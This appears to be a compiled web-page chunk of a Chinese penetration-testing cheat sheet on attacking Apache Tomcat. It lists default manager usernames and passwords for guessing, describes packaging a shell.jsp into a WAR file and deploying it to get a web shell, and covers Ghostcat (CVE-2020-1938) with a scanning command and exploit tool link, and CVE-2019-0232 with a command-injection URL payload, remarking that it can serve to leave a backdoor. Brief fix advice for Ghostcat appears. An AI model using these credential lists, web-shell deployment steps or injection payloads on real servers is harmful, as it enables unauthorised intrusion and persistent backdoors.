(window.webpackJsonp=window.webpackJsonp||[]).push([[79],{843:function(a,s,t){"use strict";t.r(s);var n=t(103),e=Object(n.a)({},(function(){var a=this,s=a.$createElement,t=a._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h2",{attrs:{id:"应用简介"}},[a._v("应用简介 "),t("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[a._v("#")])]),a._v(" "),t("p",[a._v("Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一")]),a._v(" "),t("h2",{attrs:{id:"控制台弱口令"}},[a._v("控制台弱口令 "),t("a",{staticClass:"header-anchor",attrs:{href:"#控制台弱口令"}},[a._v("#")])]),a._v(" "),t("p",[a._v("1、访问"),t("code",[a._v("ip:8080/manager/html")])]),a._v(" "),t("p",[a._v("用户名")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("tomcat\nadmin\ntest\nsysadmin\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br")])]),t("p",[a._v("密码")]),a._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[a._v("tomcat\nTomcat\n\nadmin\nAdmin\nAdmin@123\n123456\n654321\n000000\n111111\n其它更多自己收集字典~\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br"),t("span",{staticClass:"line-number"},[a._v("7")]),t("br"),t("span",{staticClass:"line-number"},[a._v("8")]),t("br"),t("span",{staticClass:"line-number"},[a._v("9")]),t("br"),t("span",{staticClass:"line-number"},[a._v("10")]),t("br"),t("span",{staticClass:"line-number"},[a._v("11")]),t("br")])]),t("p",[a._v("2、部署"),t("code",[a._v("war包")]),a._v("getshell")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#shell.jsp单独放置一个目录，命令行下进入当前目录,打包成war包")]),a._v("\njar -cvf login.war ."),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br")])]),t("p",[a._v("找到 WAR file to deploy 这一项，上传war包后应用即可")]),a._v(" "),t("h2",{attrs:{id:"cve-2020-1938-ajp文件包含"}},[a._v("[CVE-2020-1938]-AJP文件包含 "),t("a",{staticClass:"header-anchor",attrs:{href:"#cve-2020-1938-ajp文件包含"}},[a._v("#")])]),a._v(" "),t("p",[t("strong",[a._v("漏洞概述")])]),a._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[a._v("#影响版本 8009端口\nApache Tomcat 9.x < 9.0.31\nApache Tomcat 8.x < 8.5.51\nApache Tomcat 7.x < 7.0.100\nApache Tomcat 6.x\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br")])]),t("p",[a._v("Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。")]),a._v(" "),t("p",[t("strong",[a._v("漏洞利用")])]),a._v(" "),t("p",[a._v("Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009，用长亭的Xray检测即可")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[a._v("xray servicescan --target "),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("127.0")]),a._v(".0.1:8009\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("一个比较全的Tomcat利用工具-https://github.com/hypn0s/AJPy")]),a._v(" "),t("ul",[t("li",[a._v("WAR包 上传")]),a._v(" "),t("li",[a._v("利用CVE-2020-1938读取文件等")])]),a._v(" "),t("p",[t("strong",[a._v("修复建议")])]),a._v(" "),t("p",[a._v("关闭Tomcat AJP Connector，限制8009端口访问")]),a._v(" "),t("h2",{attrs:{id:"cve-2019-0232-远程代码执行-鸡肋-可用来留后门"}},[a._v("[CVE-2019-0232]-远程代码执行（鸡肋-可用来留后门） "),t("a",{staticClass:"header-anchor",attrs:{href:"#cve-2019-0232-远程代码执行-鸡肋-可用来留后门"}},[a._v("#")])]),a._v(" "),t("p",[t("strong",[a._v("漏洞概述")])]),a._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[a._v("#影响版本\t条件：{系统为Windows，启用了CGI Servlet（默认为关闭）}\nTomcat 9.0.0~9.0.17\nTomcat 8.5.0~8.5.39\nTomcat 7.0.0~7.0.93\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br")])]),t("p",[a._v("由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击")]),a._v(" "),t("p",[t("strong",[a._v("漏洞利用")])]),a._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("http:")]),a._v("//localhost:8080/cgi-bin/hello.bat?&net+user\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("https://github.com/pyn3rd/CVE-2019-0232")])])}),[],!1,null,null,null);s.default=e.exports}}]);